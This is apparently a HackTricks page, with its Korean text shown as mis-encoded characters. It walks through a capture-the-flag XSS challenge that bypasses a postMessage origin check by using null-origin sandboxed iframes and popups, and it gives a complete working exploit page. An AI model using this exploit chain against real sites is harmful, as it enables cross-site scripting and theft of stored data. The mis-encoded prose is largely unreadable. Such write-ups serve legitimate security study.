# Bypassing SOP with Iframes - 1

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Iframes in SOP-1

ì´ [**ë„ì „ ê³¼ì œ**](https://github.com/terjanq/same-origin-xss)ëŠ” [**NDevTK**](https://github.com/NDevTK)ì™€ [**Terjanq**](https://github.com/terjanq)ê°€ ë§Œë“  ê²ƒìœ¼ë¡œ, ì½”ë”©ëœ XSSë¥¼ ì´ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
ì£¼ìš” ë¬¸ì œëŠ” [**ë©”ì¸ í˜ì´ì§€**](https://so-xss.terjanq.me)ê°€ `data.body`ë¥¼ ì „ì†¡í•˜ê¸° ìœ„í•´ DomPurifyë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ìì‹ ì˜ HTML ë°ì´í„°ë¥¼ í•´ë‹¹ ì½”ë“œë¡œ ì „ì†¡í•˜ë ¤ë©´ `e.origin !== window.origin`ì„ **ìš°íšŒ**í•´ì•¼ í•©ë‹ˆë‹¤.

ê·¸ë“¤ì´ ì œì•ˆí•˜ëŠ” í•´ê²°ì±…ì„ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

### SOP ìš°íšŒ 1 (e.origin === null)

`//example.org`ê°€ **ìƒŒë“œë°•ìŠ¤ iframe**ì— í¬í•¨ë˜ë©´ í˜ì´ì§€ì˜ **origin**ì€ **`null`**ì´ ë©ë‹ˆë‹¤. ì¦‰, **`window.origin === null`**ì…ë‹ˆë‹¤. ë”°ë¼ì„œ `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">`ë¥¼ í†µí•´ iframeì„ í¬í•¨ì‹œí‚¤ê¸°ë§Œ í•˜ë©´ **`null` origin**ì„ **ê°•ì œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í˜ì´ì§€ê°€ **í¬í•¨ ê°€ëŠ¥**í•˜ë‹¤ë©´ ê·¸ ë°©ë²•ìœ¼ë¡œ ë³´í˜¸ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì¿ í‚¤ëŠ” `SameSite=None`ìœ¼ë¡œ ì„¤ì •í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤).

### SOP ìš°íšŒ 2 (window.origin === null)

ëœ ì•Œë ¤ì§„ ì‚¬ì‹¤ì€ **sandbox ê°’ `allow-popups`ê°€ ì„¤ì •ë˜ë©´** **ì—´ë¦° íŒì—…**ì´ **ëª¨ë“  ìƒŒë“œë°•ìŠ¤ ì†ì„±**ì„ **ìƒì†**í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. `allow-popups-to-escape-sandbox`ê°€ ì„¤ì •ë˜ì§€ ì•ŠëŠ” í•œ ë§ì´ì£ .\
ë”°ë¼ì„œ **null origin**ì—ì„œ **íŒì—…**ì„ ì—´ë©´ íŒì—… ë‚´ë¶€ì˜ **`window.origin`**ë„ **`null`**ì´ ë©ë‹ˆë‹¤.

### ì±Œë¦°ì§€ í•´ê²°ì±…

ë”°ë¼ì„œ ì´ ì±Œë¦°ì§€ì—ì„œëŠ” **iframe**ì„ **ìƒì„±**í•˜ê³ , ì·¨ì•½í•œ XSS ì½”ë“œ í•¸ë“¤ëŸ¬ê°€ ìˆëŠ” í˜ì´ì§€(`/iframe.php`)ë¡œ **íŒì—…ì„ ì—´ë©´**, `window.origin === e.origin`ì´ë¯€ë¡œ ë‘ ê°’ì´ ëª¨ë‘ `null`ì´ê¸° ë•Œë¬¸ì— **XSSë¥¼ ì´ìš©í•  í˜ì´ë¡œë“œë¥¼ ì „ì†¡**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ **í˜ì´ë¡œë“œ**ëŠ” **ì‹ë³„ì**ë¥¼ ê°€ì ¸ì™€ì„œ **XSS**ë¥¼ **ìƒìœ„ í˜ì´ì§€**(íŒì—…ì„ ì—° í˜ì´ì§€)ë¡œ **ì „ì†¡**í•  ê²ƒì´ë©°, **ìƒìœ„ í˜ì´ì§€**ëŠ” **ì·¨ì•½í•œ** `/iframe.php`ë¡œ **ìœ„ì¹˜ ë³€ê²½**ì„ í•  ê²ƒì…ë‹ˆë‹¤. ì‹ë³„ìê°€ ì•Œë ¤ì ¸ ìˆê¸° ë•Œë¬¸ì— `window.origin === e.origin` ì¡°ê±´ì´ ë§Œì¡±ë˜ì§€ ì•Šì•„ë„ ìƒê´€ì—†ìŠµë‹ˆë‹¤(ê¸°ì–µí•˜ì„¸ìš”, originì€ **origin**ì´ **`null`**ì¸ iframeì˜ **íŒì—…**ì…ë‹ˆë‹¤) ì™œëƒí•˜ë©´ `data.identifier === identifier`ì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ **XSSê°€ ë‹¤ì‹œ íŠ¸ë¦¬ê±°**ë˜ë©°, ì´ë²ˆì—ëŠ” ì˜¬ë°”ë¥¸ originì—ì„œ ë°œìƒí•©ë‹ˆë‹¤.
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
